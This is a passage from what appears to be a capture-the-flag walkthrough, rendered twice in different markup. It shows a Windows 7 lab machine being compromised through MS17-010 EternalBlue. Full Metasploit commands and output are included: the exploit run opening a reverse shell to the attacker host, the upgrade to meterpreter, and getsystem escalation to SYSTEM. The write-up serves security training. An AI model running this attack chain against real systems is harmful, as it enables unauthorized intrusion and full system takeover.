+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49159/tcp open  msrpc              Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+<p>Host script results:
+|_clock-skew: mean: 1h15m01s, deviation: 2h30m00s, median: 0s
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <!-- raw HTML omitted -->, NetBIOS MAC:
+02:d2:17:3d:b2:64 (unknown)
+| smb-os-discovery:
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-03-25T09:28:55-05:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2020-03-25T14:28:55
+|_  start_date: 2020-03-25T14:11:35</p>
+<p>Service detection performed. Please report any incorrect results at
+<a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .</p>
+<h1 id="nmap-done-at-wed-mar-25-103001-2020----1-ip-address-1-host-up-scanned-in">Nmap done at Wed Mar 25 10:30:01 2020 &ndash; 1 IP address (1 host up) scanned in</h1>
+<p>215.17 seconds</p>
+<pre><code>
+
+2. We find 3 ports with port number under 1000:
+* 135
+* 139
+* 445
+
+
+3. We see that the machine is running Windows &amp; SP 1. We look for exploits for
+   this OS on google, and one that mostly comes up is the vulnerability
+ms17-010.
+
+
+# Task 2: Gain access
+
+1. We start metasploit
+</code></pre><p>msfconsole
+[-] ***rting the Metasploit Framework console&hellip;<br>
+[-] * WARNING: No database support: No database YAML file                                                                                        <br>
+[-] ***</p>
+<p>MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm <code>?MMM             MMMM</code> dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+<a href="https://metasploit.com">https://metasploit.com</a></p>
+<pre><code>   =[ metasploit v5.0.60-dev                          ]
+</code></pre>
+<ul>
+<li>&ndash; &ndash;=[ 1947 exploits - 1089 auxiliary - 333 post       ]</li>
+<li>&ndash; &ndash;=[ 556 payloads - 45 encoders - 10 nops            ]</li>
+<li>&ndash; &ndash;=[ 7 evasion                                       ]</li>
+</ul>
+<pre><code>
+2. We search for exploits for the vulnerability ms17-010:
+</code></pre><p>msf5 &gt; search ms17-010</p>
+<h1 id="matching-modules">Matching Modules</h1>
+<h1 id="name-------------------------------------------disclosure-date--rank">Name                                           Disclosure Date  Rank</h1>
+<p>Check  Description</p>
+<hr>
+<pre><code>  -----  -----------
+</code></pre>
+<p>0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal
+Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote
+Windows Command Execution
+1  auxiliary/scanner/smb/smb_ms17_010                              normal
+Yes    MS17-010 SMB RCE Detection
+2  exploit/windows/smb/doublepulsar_rce           2017-04-14       great
+Yes    DOUBLEPULSAR Payload Execution and Neutralization
+3  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average
+Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+4  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average
+No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+5  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal
+Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote
+Windows Code Execution</p>
+<pre><code>
+Here, we will use the exploit ```exploit/windows/smb/ms17_010_eternalblue```.
+</code></pre><p>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt;</p>
+<pre><code>## Info:
+Description:
+  This module is a port of the Equation Group ETERNALBLUE exploit, 
+  part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
+  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is 
+  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
+  where a DWORD is subtracted into a WORD. The kernel pool is groomed 
+  so that overflow is well laid-out to overwrite an SMBv1 buffer. 
+  Actual RIP hijack is later completed in 
+  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
+  not trigger 100% of the time, and should be run continuously until 
+  triggered. It seems like the pool will get hot streaks and need a 
+  cool down period before the shells rain in again. The module will 
+  attempt to use Anonymous login, by default, to authenticate to 
+  perform the exploit. If the user supplies credentials in the 
+  SMBUser, SMBPass, and SMBDomain options it will use those instead. 
+  On some systems, this module may cause system instability and 
+  crashes, such as a BSOD or a reboot. This may be more likely with 
+  some payloads.
+
+References:
+  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
+  https://cvedetails.com/cve/CVE-2017-0143/
+  https://cvedetails.com/cve/CVE-2017-0144/
+  https://cvedetails.com/cve/CVE-2017-0145/
+  https://cvedetails.com/cve/CVE-2017-0146/
+  https://cvedetails.com/cve/CVE-2017-0147/
+  https://cvedetails.com/cve/CVE-2017-0148/
+  https://github.com/RiskSense-Ops/MS17-010
+
+
+3. We check the options for this exploit:
+</code></pre><p>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; options</p>
+<p>Module options (exploit/windows/smb/ms17_010_eternalblue):</p>
+<p>Name           Current Setting  Required  Description</p>
+<hr>
+<p>RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &lsquo;file:<!-- raw HTML omitted -->&rsquo;
+RPORT          445              yes       The target port (TCP)
+SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+SMBPass                         no        (Optional) The password for the specified username
+SMBUser                         no        (Optional) The username to authenticate as
+VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</p>
+<p>Exploit target:</p>
+<p>Id  Name</p>
+<hr>
+<p>0   Windows 7 and Server 2008 R2 (x64) All Service Packs</p>
+<pre><code>
+We see that we have to set out RHOSTS whick will be our target machine.So, we
+set RHOST with the ip address of the windows machine from the site:
+</code></pre><p>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.221.176
+RHOSTS =&gt; 10.10.221.176</p>
+<pre><code>
+4. We run the exploit.
+</code></pre><p>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</p>
+<p>[<em>] Started reverse TCP handler on 10.8.30.133:4444
+[+] 10.10.247.170:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[</em>] 10.10.247.170:445 - Connecting to target for exploitation.
+[+] 10.10.247.170:445 - Connection established for exploitation.
+[+] 10.10.247.170:445 - Target OS selected valid for OS indicated by SMB reply
+[<em>] 10.10.247.170:445 - CORE raw buffer dump (42 bytes)
+[</em>] 10.10.247.170:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[<em>] 10.10.247.170:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[</em>] 10.10.247.170:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31 ice Pack 1   <br>
+[+] 10.10.247.170:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[<em>] 10.10.247.170:445 - Trying exploit with 12 Groom Allocations.
+[</em>] 10.10.247.170:445 - Sending all but last fragment of exploit packet
+[<em>] 10.10.247.170:445 - Starting non-paged pool grooming
+[+] 10.10.247.170:445 - Sending SMBv2 buffers
+[+] 10.10.247.170:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[</em>] 10.10.247.170:445 - Sending final SMBv2 buffers.
+[<em>] 10.10.247.170:445 - Sending last fragment of exploit packet!
+[</em>] 10.10.247.170:445 - Receiving response from exploit packet
+[+] 10.10.247.170:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[<em>] 10.10.247.170:445 - Sending egg to corrupted connection.
+[</em>] 10.10.247.170:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (10.8.30.133:4444 -&gt; 10.10.247.170:49184) at 2020-03-25 15:17:21 -0400
+[+] 10.10.247.170:445</p>
+<ul>
+<li>=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.247.170:445</li>
+<li>=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.247.170:445</li>
+<li>=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</li>
+</ul>
+<p>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</p>
+<p>C:\Windows\system32&gt;</p>
+<pre><code>
+Voila! we got a shell!
+
+
+
+5. We background the shell using Ctrl+z
+
+
+
+
+## Task 3: Escalate 
+
+1. In order to convert the shell to a meterpreter shell, we use the following
+   exploit:
+</code></pre><p>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use
+post/multi/manage/shell_to_meterpreter
+msf5 post(multi/manage/shell_to_meterpreter) &gt;</p>
+<pre><code>
+
+2. We check the options for this exploit:
+</code></pre><p>msf5 post(multi/manage/shell_to_meterpreter) &gt; options</p>
+<p>Module options (post/multi/manage/shell_to_meterpreter):</p>
+<p>Name     Current Setting  Required  Description</p>
+<hr>
+<p>HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+LPORT    4433             yes       Port for payload to connect to.
+SESSION                   yes       The session to run this module on.</p>
+<pre><code>
+So the option that we are required to change is ```SESSION```
+
+
+
+3. In order to ser the option session we need the session id of our previously
+   opened shell. To find the session id, we enter the command ```sessions -l```
+</code></pre><p>msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions -l</p>
+<h1 id="active-sessions">Active sessions</h1>
+<p>Id  Name  Type               Information                           Connection</p>
+<hr>
+<p>1         shell x64/windows  Microsoft Windows [Version 6.1.7601]  10.8.30.133:4444 -&gt; 10.10.247.170:49184 (10.10.247.170)</p>
+<pre><code>
+So, the session id is 1. We set the session
+</code></pre><p>msf5 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 1
+SESSION =&gt; 1</p>
+<pre><code>
+
+4. We run the exploit.
+</code></pre><p>msf5 post(multi/manage/shell_to_meterpreter) &gt; run</p>
+<p>[<em>] Upgrading session ID: 1
+[</em>] Starting exploit/multi/handler
+[<em>] Started reverse TCP handler on 10.8.30.133:4433
+[</em>] Post module execution completed
+msf5 post(multi/manage/shell_to_meterpreter) &gt;
+[<em>] Sending stage (180291 bytes) to 10.10.247.170
+[</em>] Meterpreter session 2 opened (10.8.30.133:4433 -&gt; 10.10.247.170:49193) at 2020-03-25 15:24:05 -0400
+[*] Stopping exploit/multi/handler</p>
+<p>msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions</p>
+<h1 id="active-sessions-1">Active sessions</h1>
+<p>Id  Name  Type                     Information                           Connection</p>
+<hr>
+<p>1         shell x64/windows        Microsoft Windows [Version 6.1.7601]  10.8.30.133:4444 -&gt; 10.10.247.170:49184 (10.10.247.170)
+2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC          10.8.30.133:4433 -&gt; 10.10.247.170:49193 (10.10.247.170)</p>
+<pre><code>
+We see that we got a meterpreter shell!
+
+
+5. We can interact with th meterpreter shell using the following command:
+</code></pre><p>msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 2
+[*] Starting interaction with 2&hellip;</p>
+<p>meterpreter &gt;</p>
+<pre><code>
+6. We run getsystem, shell and whoami to check if we have escalated to NT
+   AUTHORITY\SYSTEM
+</code></pre><p>meterpreter &gt; getsystem
+&hellip;got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter &gt; shell
+Process 2216 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</p>
+<p>C:\Windows\system32&gt;whoami
+whoami
+nt authority\system</p>
+<p>Ck 1:</p>
+<ol>
+<li>We use the usual nmap to scan the machine. Note that it says that the
+machine does not respond to ICMP requests. So, we have to use <code>-Pn</code>
+with nmap for scanning</li>
+</ol>
+<pre><code>nmap -sC -sV -Pn -oN nmap-out 10.10.221.176
+</code></pre><p>The results:</p>
+<pre><code># Nmap 7.80 scan initiated Wed Mar 25 10:26:26 2020 as: nmap -sC -sV -Pn -oN
+nmap.out 10.10.221.176
+Nmap scan report for 10.10.221.176
+Host is up (0.23s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack
+1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+|_ssl-date: 2020-03-25T14:29:02+00:00; +1s from scanner time.
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49159/tcp open  msrpc              Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h15m01s, deviation: 2h30m00s, median: 0s
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC:
+02:d2:17:3d:b2:64 (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-03-25T09:28:55-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-03-25T14:28:55
+|_  start_date: 2020-03-25T14:11:35
+
+Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ .
+# Nmap done at Wed Mar 25 10:30:01 2020 -- 1 IP address (1 host up) scanned in
+215.17 seconds
+</code></pre><ol start="2">
+<li>We find 3 ports with port number under 1000:</li>
+</ol>
+<ul>
+<li>135</li>
+<li>139</li>
+<li>445</li>
+</ul>
+<ol start="3">
+<li>We see that the machine is running Windows &amp; SP 1. We look for exploits for
+this OS on google, and one that mostly comes up is the vulnerability
+ms17-010.</li>
+</ol>
+<h1 id="task-2-gain-access-1">Task 2: Gain access</h1>
+<ol>
+<li>We start metasploit</li>
+</ol>
+<pre><code>msfconsole
+[-] ***rting the Metasploit Framework console...\
+[-] * WARNING: No database support: No database YAML file                                                                                           
+[-] ***
+                                                  
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+
+       =[ metasploit v5.0.60-dev                          ]
++ -- --=[ 1947 exploits - 1089 auxiliary - 333 post       ]
++ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+</code></pre><ol start="2">
+<li>We search for exploits for the vulnerability ms17-010:</li>
+</ol>
+<pre><code>msf5 &gt; search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank
+Check  Description
+   -  ----                                           ---------------  ----
+      -----  -----------
+   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal
+Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote
+Windows Command Execution
+   1  auxiliary/scanner/smb/smb_ms17_010                              normal
+Yes    MS17-010 SMB RCE Detection
+   2  exploit/windows/smb/doublepulsar_rce           2017-04-14       great
+Yes    DOUBLEPULSAR Payload Execution and Neutralization
+   3  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average
+Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   4  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average
+No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   5  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal
+Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote
+Windows Code Execution
+</code></pre><p>Here, we will use the exploit <code>exploit/windows/smb/ms17_010_eternalblue</code>.</p>
+<pre><code>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; 
+
+</code></pre><h2 id="info-1">Info:</h2>
+<p>Description:
+This module is a port of the Equation Group ETERNALBLUE exploit,
+part of the FuzzBunch toolkit released by Shadow Brokers. There is a
+buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is
+calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error
+where a DWORD is subtracted into a WORD. The kernel pool is groomed
+so that overflow is well laid-out to overwrite an SMBv1 buffer.
+Actual RIP hijack is later completed in
+srvnet!SrvNetWskReceiveComplete. This exploit, like the original may
+not trigger 100% of the time, and should be run continuously until
+triggered. It seems like the pool will get hot streaks and need a
+cool down period before the shells rain in again. The module will
+attempt to use Anonymous login, by default, to authenticate to
+perform the exploit. If the user supplies credentials in the
+SMBUser, SMBPass, and SMBDomain options it will use those instead.
+On some systems, this module may cause system instability and
+crashes, such as a BSOD or a reboot. This may be more likely with
+some payloads.</p>
+<p>References:
+<a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010">https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010</a>
+<a href="https://cvedetails.com/cve/CVE-2017-0143/">https://cvedetails.com/cve/CVE-2017-0143/</a>
+<a href="https://cvedetails.com/cve/CVE-2017-0144/">https://cvedetails.com/cve/CVE-2017-0144/</a>
+<a href="https://cvedetails.com/cve/CVE-2017-0145/">https://cvedetails.com/cve/CVE-2017-0145/</a>
+<a href="https://cvedetails.com/cve/CVE-2017-0146/">https://cvedetails.com/cve/CVE-2017-0146/</a>
+<a href="https://cvedetails.com/cve/CVE-2017-0147/">https://cvedetails.com/cve/CVE-2017-0147/</a>
+<a href="https://cvedetails.com/cve/CVE-2017-0148/">https://cvedetails.com/cve/CVE-2017-0148/</a>
+<a href="https://github.com/RiskSense-Ops/MS17-010">https://github.com/RiskSense-Ops/MS17-010</a></p>
+<ol start="3">
+<li>We check the options for this exploit:</li>
+</ol>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), range CIDR
+identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to
+use for authentication
+   SMBPass                         no        (Optional) The password for the
+specified username
+   SMBUser                         no        (Optional) The username to
+authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture
+matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit
+Target.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+</code></pre><p>We see that we have to set out RHOSTS whick will be our target machine.So, we
+set RHOST with the ip address of the windows machine from the site:</p>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.221.176
+RHOSTS =&gt; 10.10.221.176
+
+</code></pre><ol start="4">
+<li>We run the exploit.</li>
+</ol>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run
+
+[*] Started reverse TCP handler on 10.8.30.133:4444 
+[+] 10.10.247.170:445     - Host is likely VULNERABLE to MS17-010! - Windows
+7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.247.170:445 - Connecting to target for exploitation.
+[+] 10.10.247.170:445 - Connection established for exploitation.
+[+] 10.10.247.170:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.247.170:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.247.170:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66
+65 73  Windows 7 Profes
+[*] 10.10.247.170:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65
+72 76  sional 7601 Serv
+[*] 10.10.247.170:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31
+ice Pack 1      
+[+] 10.10.247.170:445 - Target arch selected valid for arch indicated by
+DCE/RPC reply
+[*] 10.10.247.170:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.247.170:445 - Sending all but last fragment of exploit packet
+[*] 10.10.247.170:445 - Starting non-paged pool grooming
+[+] 10.10.247.170:445 - Sending SMBv2 buffers
+[+] 10.10.247.170:445 - Closing SMBv1 connection creating free hole adjacent to
+SMBv2 buffer.
+[*] 10.10.247.170:445 - Sending final SMBv2 buffers.
+[*] 10.10.247.170:445 - Sending last fragment of exploit packet!
+[*] 10.10.247.170:445 - Receiving response from exploit packet
+[+] 10.10.247.170:445 - ETERNALBLUE overwrite completed successfully
+(0xC000000D)!
+[*] 10.10.247.170:445 - Sending egg to corrupted connection.
+[*] 10.10.247.170:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (10.8.30.133:4444 -&gt; 10.10.247.170:49184) at
+2020-03-25 15:17:21 -0400
+[+] 10.10.247.170:445
+- =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.247.170:445
+- =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.247.170:445
+- =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;
+</code></pre><p>Voila! we got a shell!</p>
+<ol start="5">
+<li>We background the shell using Ctrl+z</li>
+</ol>
+<h2 id="task-3-escalate-1">Task 3: Escalate</h2>
+<ol>
+<li>In order to convert the shell to a meterpreter shell, we use the following
+exploit:</li>
+</ol>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use
+post/multi/manage/shell_to_meterpreter
+msf5 post(multi/manage/shell_to_meterpreter) &gt; 
+</code></pre><ol start="2">
+<li>We check the options for this exploit:</li>
+</ol>
+<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to
+receive the connection
+   LHOST                     no        IP of host that will receive the
+connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on.
+</code></pre><p>So the option that we are required to change is <code>SESSION</code></p>
+<ol start="3">
+<li>In order to ser the option session we need the session id of our previously
+opened shell. To find the session id, we enter the command <code>sessions -l</code></li>
+</ol>
+<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                           Connection
+  --  ----  ----               -----------                           ----------
+  1         shell x64/windows  Microsoft Windows [Version 6.1.7601]
+10.8.30.133:4444 -&gt; 10.10.247.170:49184 (10.10.247.170)
+</code></pre><p>So, the session id is 1. We set the session</p>
+<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 1
+SESSION =&gt; 1
+</code></pre><ol start="4">
+<li>We run the exploit.</li>
+</ol>
+<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; run
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.8.30.133:4433 
+[*] Post module execution completed
+msf5 post(multi/manage/shell_to_meterpreter) &gt; 
+[*] Sending stage (180291 bytes) to 10.10.247.170
+[*] Meterpreter session 2 opened (10.8.30.133:4433 -&gt; 10.10.247.170:49193) at
+2020-03-25 15:24:05 -0400
+[*] Stopping exploit/multi/handler
+
+msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information
+Connection
+  --  ----  ----                     -----------
+----------
+  1         shell x64/windows        Microsoft Windows [Version 6.1.7601]
+10.8.30.133:4444 -&gt; 10.10.247.170:49184 (10.10.247.170)
+  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC
+10.8.30.133:4433 -&gt; 10.10.247.170:49193 (10.10.247.170)
+</code></pre><p>We see that we got a meterpreter shell!</p>
+<ol start="5">
+<li>We can interact with th meterpreter shell using the following command:</li>
+</ol>
+<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter &gt; 
+</code></pre><ol start="6">
+<li>We run getsystem, shell and whoami to check if we have escalated to NT
+AUTHORITY\SYSTEM</li>
+</ol>
+<pre><code>meterpreter &gt; getsystem 
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter &gt; shell
+Process 2216 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;
+</code></pre><p>So, we are in fact system!</p>
+<ol start="7">
+<li>We enter the command <code>ps</code> to view the running processes</li>
+</ol>
+<pre><code>C:\Windows\system32&gt;^Z
+Background channel 1? [y/N]  y
+meterpreter &gt; ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User
+Path
+ ---   ----  ----                  ----  -------  ----
+----
+ 0     0     [System Process]                                                   
+ 4     0     System                x64   0                                      
+ 396   652   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM
+C:\Windows\System32\LogonUI.exe
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\smss.exe
+ 428   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\svchost.exe
+ 536   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\svchost.exe
+ 552   544   csrss.exe             x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\csrss.exe
+ 600   544   wininit.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\wininit.exe
+ 612   592   csrss.exe             x64   1        NT AUTHORITY\SYSTEM
+C:\Windows\System32\csrss.exe
+ 652   592   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM
+C:\Windows\System32\winlogon.exe
+ 700   600   services.exe          x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\services.exe
+ 708   600   lsass.exe             x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\lsass.exe
+ 716   600   lsm.exe               x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\lsm.exe
+ 824   700   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
+C:\Windows\System32\svchost.exe
